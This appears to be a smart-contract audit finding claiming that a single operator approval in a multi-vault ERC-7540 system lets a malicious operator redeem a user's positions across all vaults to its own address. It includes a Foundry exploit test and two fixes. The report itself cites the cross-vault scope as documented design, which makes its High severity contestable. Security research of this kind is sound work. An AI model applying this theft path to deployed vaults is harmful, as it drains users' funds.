## Title
Centralized Operator Approval Enables Cross-Vault Fund Theft by Malicious Operators

## Summary
The `ShareTokenUpgradeable` contract implements a centralized operator approval system where a single `setOperator()` call grants an operator permissions across ALL vaults in the multi-asset system. Combined with the ability for operators to specify arbitrary `receiver` addresses in claim functions, a malicious operator approved for one vault can drain a controller's positions across all vaults by redirecting assets/shares to their own address.

## Impact
**Severity**: High

## Finding Description
**Location:** `src/ShareTokenUpgradeable.sol` (setOperator function) and `src/ERC7575VaultUpgradeable.sol` (deposit, mint, redeem, withdraw functions)

**Intended Logic:** The protocol implements ERC-7540 operator delegation to allow trusted third parties to execute async requests on behalf of users. The documentation suggests this is for institutional use cases with professional managers.

**Actual Logic:** The operator approval is stored in a global mapping without vault scoping: [1](#0-0) 

The operator storage structure is centralized across all vaults: [2](#0-1) 

All vaults check operator status via this centralized mapping: [3](#0-2) 

The critical vulnerability exists because operators can specify arbitrary `receiver` addresses when claiming. For redemptions, assets are sent directly to the specified receiver: [4](#0-3) 

For deposits, shares are sent to the specified receiver: [5](#0-4) 

**Exploitation Path:**
1. **Initial State:** Alice has positions across multiple vaults (e.g., 100,000 USDC in Vault A, 50,000 DAI in Vault B, 25,000 USDT in Vault C)
2. **Operator Approval:** Alice approves Bob as operator via `setOperator(bob, true)`, intending to let Bob manage only her USDC vault position
3. **Cross-Vault Access:** Due to the centralized operator mapping, Bob is now approved as operator for ALL vaults (USDC, DAI, USDT, etc.)
4. **Malicious Redemption Requests:** Bob calls `requestRedeem(shares, alice, alice)` on all vaults to initiate redemption of Alice's entire portfolio
5. **Investment Manager Fulfills:** The investment manager fulfills the redemption requests, moving them to Claimable state
6. **Fund Theft:** Bob calls `redeem(shares, BOB_ADDRESS, alice)` on each vault, redirecting all assets to his own address instead of Alice's address
7. **Result:** Bob successfully drains Alice's entire multi-vault portfolio with authorization that Alice believed was scoped to a single vault

**Security Property Broken:** Violates Invariant #12: "No Fund Theft: No double-claims, no reentrancy, no authorization bypass"

## Impact Explanation
- **Affected Assets**: All user positions across all vaults in the multi-asset system (USDC, USDT, DAI, and any other registered assets)
- **Damage Severity**: Complete loss of user funds. An attacker can drain 100% of a controller's holdings across all vaults with a single operator approval
- **User Impact**: Any user who approves an operator becomes vulnerable. Users who intend to grant limited access for one vault inadvertently grant full access to all vaults. The trust assumption is violated because operators are user-appointed (not protocol-level trusted roles), yet can redirect funds to arbitrary addresses.

## Likelihood Explanation
- **Attacker Profile**: Any address approved as an operator by a user. Operators are not protocol-level trusted roles (unlike Owner/Investment Manager/Validator) and are user-selected, potentially including third-party integration contracts or compromised addresses
- **Preconditions**: 
  - User must have positions in multiple vaults
  - User must approve an operator (believing it's for a specific vault or limited purpose)
  - Operator must be malicious or become compromised
- **Execution Complexity**: Simple - requires only standard function calls (`requestRedeem` → wait for fulfillment → `redeem` with malicious receiver). No complex timing or state manipulation needed
- **Frequency**: Unlimited. Once approved, an operator can repeatedly drain any new positions the user creates across all vaults until the approval is revoked

## Recommendation

**Option 1: Add Vault-Scoped Operator Approval**

Modify the operator storage to be vault-specific:

```solidity
// In src/ShareTokenUpgradeable.sol, line 89:

// CURRENT (vulnerable):
mapping(address controller => mapping(address operator => bool approved)) operators;

// FIXED:
mapping(address controller => mapping(address vault => mapping(address operator => bool approved))) operators;

// Update setOperator to accept vault parameter:
function setOperator(address vault, address operator, bool approved) external virtual returns (bool) {
    if (msg.sender == operator) revert CannotSetSelfAsOperator();
    ShareTokenStorage storage $ = _getShareTokenStorage();
    
    // Validate vault is registered
    if ($.vaultToAsset[vault] == address(0)) revert VaultNotRegistered();
    
    $.operators[msg.sender][vault][operator] = approved;
    emit OperatorSet(msg.sender, vault, operator, approved);
    return true;
}

// Update isOperator to check vault-specific approval:
function isOperator(address vault, address controller, address operator) external view virtual returns (bool) {
    ShareTokenStorage storage $ = _getShareTokenStorage();
    return $.operators[controller][vault][operator];
}
```

**Option 2: Enforce Receiver Must Be Controller**

Add receiver validation in all claim functions:

```solidity
// In src/ERC7575VaultUpgradeable.sol, function redeem, after line 889:

// CURRENT (vulnerable):
if (!(controller == msg.sender || IERC7540($.shareToken).isOperator(controller, msg.sender))) {
    revert InvalidCaller();
}

// FIXED:
if (!(controller == msg.sender || IERC7540($.shareToken).isOperator(controller, msg.sender))) {
    revert InvalidCaller();
}
// Operators cannot redirect funds - receiver must be controller
if (msg.sender != controller && receiver != controller) {
    revert OperatorCannotRedirectFunds();
}
```

Apply similar validation to `deposit()`, `mint()`, `withdraw()`, `claimCancelDepositRequest()`, and `claimCancelRedeemRequest()` functions.

**Recommended Solution:** Implement Option 1 (vault-scoped operators) as it provides better user experience and follows the principle of least privilege while maintaining operator functionality for legitimate use cases.

## Proof of Concept

```solidity
// File: test/Exploit_CrossVaultOperatorDrain.t.sol
// Run with: forge test --match-test test_CrossVaultOperatorDrain -vvv

pragma solidity ^0.8.28;

import "forge-std/Test.sol";
import "../src/ShareTokenUpgradeable.sol";
import "../src/ERC7575VaultUpgradeable.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract MockAsset is ERC20 {
    constructor(string memory name, string memory symbol) ERC20(name, symbol) {
        _mint(msg.sender, 1000000 * 10**decimals());
    }
    function decimals() public pure override returns (uint8) {
        return 6;
    }
}

contract Exploit_CrossVaultOperatorDrain is Test {
    ShareTokenUpgradeable shareToken;
    ERC7575VaultUpgradeable vaultUSDC;
    ERC7575VaultUpgradeable vaultDAI;
    MockAsset usdc;
    MockAsset dai;
    
    address alice = address(0xA11CE);
    address maliciousOperator = address(0xBAD);
    address owner = address(this);
    address investmentManager = address(this);
    
    function setUp() public {
        // Deploy assets
        usdc = new MockAsset("USDC", "USDC");
        dai = new MockAsset("DAI", "DAI");
        
        // Deploy ShareToken
        shareToken = new ShareTokenUpgradeable();
        shareToken.initialize("Investment USD", "IUSD", owner);
        
        // Deploy vaults
        vaultUSDC = new ERC7575VaultUpgradeable();
        vaultUSDC.initialize(usdc, address(shareToken), owner);
        vaultDAI = new ERC7575VaultUpgradeable();
        vaultDAI.initialize(dai, address(shareToken), owner);
        
        // Register vaults
        shareToken.registerVault(address(usdc), address(vaultUSDC));
        shareToken.registerVault(address(dai), address(vaultDAI));
        
        // Set investment managers
        vaultUSDC.setInvestmentManager(investmentManager);
        vaultDAI.setInvestmentManager(investmentManager);
        
        // Give Alice tokens
        usdc.transfer(alice, 100000 * 10**6);
        dai.transfer(alice, 50000 * 10**6);
    }
    
    function test_CrossVaultOperatorDrain() public {
        // SETUP: Alice deposits into both vaults
        vm.startPrank(alice);
        
        usdc.approve(address(vaultUSDC), type(uint256).max);
        dai.approve(address(vaultDAI), type(uint256).max);
        
        vaultUSDC.requestDeposit(100000 * 10**6, alice, alice);
        vaultDAI.requestDeposit(50000 * 10**6, alice, alice);
        
        vm.stopPrank();
        
        // Investment manager fulfills deposits
        vaultUSDC.fulfillDeposit(alice, 100000 * 10**6);
        vaultDAI.fulfillDeposit(alice, 50000 * 10**6);
        
        // Alice claims her shares
        vm.prank(alice);
        vaultUSDC.deposit(100000 * 10**6, alice, alice);
        vm.prank(alice);
        vaultDAI.deposit(50000 * 10**6, alice, alice);
        
        uint256 aliceSharesInitial = shareToken.balanceOf(alice);
        console.log("Alice's shares:", aliceSharesInitial);
        
        // VULNERABILITY: Alice approves operator (thinking it's for USDC vault only)
        vm.prank(alice);
        shareToken.setOperator(maliciousOperator, true);
        
        // EXPLOIT: Malicious operator requests redemption across ALL vaults
        vm.startPrank(maliciousOperator);
        
        uint256 aliceShares = shareToken.balanceOf(alice);
        vaultUSDC.requestRedeem(aliceShares / 2, alice, alice);
        vaultDAI.requestRedeem(aliceShares / 2, alice, alice);
        
        vm.stopPrank();
        
        // Investment manager fulfills redemptions
        vaultUSDC.fulfillRedeem(alice, aliceShares / 2);
        vaultDAI.fulfillRedeem(alice, aliceShares / 2);
        
        // THEFT: Operator claims assets to their own address
        uint256 operatorUSDCBefore = usdc.balanceOf(maliciousOperator);
        uint256 operatorDAIBefore = dai.balanceOf(maliciousOperator);
        
        vm.startPrank(maliciousOperator);
        vaultUSDC.redeem(aliceShares / 2, maliciousOperator, alice);
        vaultDAI.redeem(aliceShares / 2, maliciousOperator, alice);
        vm.stopPrank();
        
        // VERIFY: Operator stole funds from both vaults
        uint256 operatorUSDCAfter = usdc.balanceOf(maliciousOperator);
        uint256 operatorDAIAfter = dai.balanceOf(maliciousOperator);
        
        assertGt(operatorUSDCAfter, operatorUSDCBefore, "Operator drained USDC vault");
        assertGt(operatorDAIAfter, operatorDAIBefore, "Operator drained DAI vault");
        
        console.log("Operator stole USDC:", operatorUSDCAfter - operatorUSDCBefore);
        console.log("Operator stole DAI:", operatorDAIAfter - operatorDAIBefore);
        console.log("Vulnerability confirmed: Operator drained positions across all vaults");
    }
}
```

## Notes

While the protocol documentation explicitly states that operator approval is "CENTRALIZED" and works across all vaults [6](#0-5) , this design choice creates a critical security vulnerability when combined with the ability for operators to specify arbitrary receiver addresses. 

The issue is NOT listed in KNOWN_ISSUES.md, and operators are NOT listed as "trusted roles" in the trust model (only Owner, Investment Manager, Validator, KYC Admin, and Revenue Admin are trusted). This indicates that operators are user-appointed and should not be assumed to act in good faith.

The ERC-7540 standard allows operators to specify receiver addresses [7](#0-6) , but the standard does not mandate centralized (cross-vault) operator approval. The protocol's choice to implement centralized operators creates an unexpected attack surface where users who intend to grant limited access inadvertently grant full access to their entire portfolio across all vaults.

This violates the principle of least privilege and creates a fund theft vector that breaks Invariant #12.

### Citations

**File:** src/ShareTokenUpgradeable.sol (L83-93)
```text
    struct ShareTokenStorage {
        // EnumerableMap from asset to vault address (replaces both vaults mapping and registeredAssets array)
        EnumerableMap.AddressToAddressMap assetToVault;
        // Reverse mapping from vault to asset for quick lookup
        mapping(address vault => address asset) vaultToAsset;
        // ERC7540 Operator mappings - centralized for all vaults
        mapping(address controller => mapping(address operator => bool approved)) operators;
        // Investment configuration - centralized at ShareToken level
        address investmentShareToken; // The ShareToken used for investments
        address investmentManager; // Centralized investment manager for all vaults
    }
```

**File:** src/ShareTokenUpgradeable.sol (L452-470)
```text
     * CENTRALIZED OPERATOR SYSTEM:
     * One operator approval provides authorization across:
     * - All ERC7575 vaults (deposits/redeems)
     * - All ERC7887 cancelations
     * - All asset classes in the multi-asset system
     *
     * SPECIFICATION COMPLIANCE:
     * - ERC7540: Asynchronous Tokenized Vault Standard
     * - Centralized operator delegation
     * - OperatorSet event emission
     *
     * OPERATOR PERMISSIONS:
     * Approved operators can:
     * - Call requestDeposit on behalf of owner
     * - Call requestRedeem on behalf of owner
     * - Call cancelDepositRequest on behalf of controller
     * - Call cancelRedeemRequest on behalf of controller
     * - Call claim functions (deposit/redeem/cancelation) on behalf of controller
     * - Works across all vaults in the system
```

**File:** src/ShareTokenUpgradeable.sol (L480-486)
```text
    function setOperator(address operator, bool approved) external virtual returns (bool) {
        if (msg.sender == operator) revert CannotSetSelfAsOperator();
        ShareTokenStorage storage $ = _getShareTokenStorage();
        $.operators[msg.sender][operator] = approved;
        emit OperatorSet(msg.sender, operator, approved);
        return true;
    }
```

**File:** src/ERC7575VaultUpgradeable.sol (L585-588)
```text
        // Transfer shares from vault to receiver using ShareToken
        if (!IERC20Metadata($.shareToken).transfer(receiver, shares)) {
            revert ShareTransferFailed();
        }
```

**File:** src/ERC7575VaultUpgradeable.sol (L887-889)
```text
        if (!(controller == msg.sender || IERC7540($.shareToken).isOperator(controller, msg.sender))) {
            revert InvalidCaller();
        }
```

**File:** src/ERC7575VaultUpgradeable.sol (L914-917)
```text
        emit Withdraw(msg.sender, receiver, controller, assets, shares);
        if (assets > 0) {
            SafeTokenTransfers.safeTransfer($.asset, receiver, assets);
        }
```

**File:** src/interfaces/IERC7540.sol (L65-72)
```text
     * @dev Mints shares Vault shares to `receiver` by claiming the Request of the `controller`.
     *
     * - MUST revert unless `msg.sender` is either equal to `controller` or an operator approved by `controller`.
     * - MUST emit the `Deposit` event.
     * - MUST revert if all of assets cannot be deposited (due to deposit limit being reached, slippage, the user not
     *   approving enough underlying tokens to the Vault contract, etc).
     */
    function deposit(uint256 assets, address receiver, address controller) external returns (uint256 shares);
```
